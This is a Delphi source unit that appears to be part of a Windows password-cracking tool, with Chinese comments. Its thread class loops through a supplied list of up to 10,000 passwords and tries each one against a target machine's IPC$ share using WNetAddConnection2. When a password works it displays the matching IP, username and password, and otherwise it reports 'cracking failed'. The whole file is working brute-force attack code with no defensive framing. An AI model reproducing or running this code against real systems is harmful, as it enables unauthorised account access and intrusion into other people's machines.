unit Unit2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, unit1;

type

  arrayPW = array[0..10000] of string[10];

  sao = class(TThread)
  public
    constructor Create(PW: arrayPW; count: integer; tIP: string; tUSER: string);
  private
    { Private declarations }
    MYPW: arrayPW;
    PWCNT: integer;
    IP: string;
    USER: string;
    CHKPW: string;
  protected
    procedure Execute; override;
    procedure DoProgress;
    procedure ShowPWS;
  end;

implementation

{ sao }

constructor sao.Create(PW: arrayPW; count: integer; tIP: string; tUSER: string);
begin
  MYPW := PW;
  PWCNT := count;
  IP := tIP;
  USER := tUSER;
  inherited Create(False);
end;

//工作线程

procedure sao.Execute;
var
  NetSource: TNetResource;
  a: Longint;
  b: integer;
begin

  for b := 1 to PWCNT do
  begin
  //利用IPC验证用户名密码
    NetSource.dwType := RESOURCETYPE_ANY;
    NetSource.lpLocalName := '';
    NetSource.lpRemoteName := pchar('\\' + IP + '\ipc$');
    NetSource.lpProvider := '';
    CHKPW := MYPW[b];
    a := WnetAddConnection2(NetSource, pchar(CHKPW), pchar(USER), 0);
    Synchronize(DoProgress);
    if a = 0 then
    begin
      WNetCancelConnection2(NetSource.lpRemoteName, 0, True);

      Synchronize(ShowPWS);

      exit;
    end;
  end;
  if form1.listbox1.Items.Count = 0 then form1.listbox1.Items.Add('破解失败');
  form1.Height := 285;
end;


procedure sao.DoProgress;
var
  tPOS: integer;
begin
  tPOS := form1.ProgressBar1.Position;
  inc(tPOS);
  form1.ProgressBar1.Position := tPOS;
end;

procedure sao.ShowPWS;
begin
  form1.listbox1.Items.Add(IP + '-->' + USER + ':' + '"' + CHKPW + '"');
  form1.ProgressBar1.Position := form1.ProgressBar1.Max;
  form1.Height := 285;
end;

end.

 